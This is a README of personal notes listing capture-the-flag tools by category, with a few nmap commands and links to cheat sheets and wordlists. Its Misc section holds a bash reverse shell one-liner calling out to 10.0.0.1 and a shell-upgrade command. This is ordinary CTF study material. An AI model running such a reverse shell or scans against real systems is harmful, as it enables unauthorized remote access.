# CTF Tool list

This repo is intended to serve as a list of tools that I've found useful during CTFs and any notes that I've got to go with them.

## Discovery

##### Nmap
Get versions
`nmap -sC -sV <target>`
Basic scan all ports
`nmap -p- <target>`


##### wfuzz

##### Gobuster

## Web
Looks for `sitemap.xml` or `robots.txt`

##### Burpsuite
##### SQLMap


## Cracking

##### John the ripper
https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf
##### Hydra
https://github.com/frizb/Hydra-Cheatsheet
##### PadBuster
Used to execute and oracle padding attack

##### Hashcat
https://github.com/frizb/Hashcat-Cheatsheet

## pwn

##### [pwntools](https://github.com/Gallopsled/pwntools)

##### ROP Gadet

## Forensics

##### strings
##### Foremost
##### Bin Walk

##### Volatility
The Volatility Framework isfor the
extraction of digital artifacts from volatile memory (RAM) samples.

https://github.com/volatilityfoundation/volatility
https://github.com/volatilityfoundation/community

## Steg

##### Exiftool
##### Stegsolve
##### Steg Crack
##### Steg Hide
##### zsteg
##### jsteg
##### pngcheck

##### Online tools
https://stylesuxx.github.io/steganography/

## Reversing

##### Radare
https://github.com/zxgio/r2-cheatsheet/blob/master/r2-cheatsheet.pdf

##### readelf

##### [checksec](https://github.com/slimm609/checksec.sh)
##### angr
##### z3

## Misc

##### Reverse Shell
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
`python -c 'import pty; pty.spawn("/bin/sh")'`
`stty raw -echo`

##### Wordlists
[Rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
[SecLists](https://github.com/danielmiessler/SecLists)

###### Cewl 
Wordlist generator

##### [Virus total](https://www.virustotal.com/)
##### [Have I been Pwned](https://haveibeenpwned.com/)


##### Linux enumeration
[Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[Linenum](https://github.com/rebootuser/LinEnum)
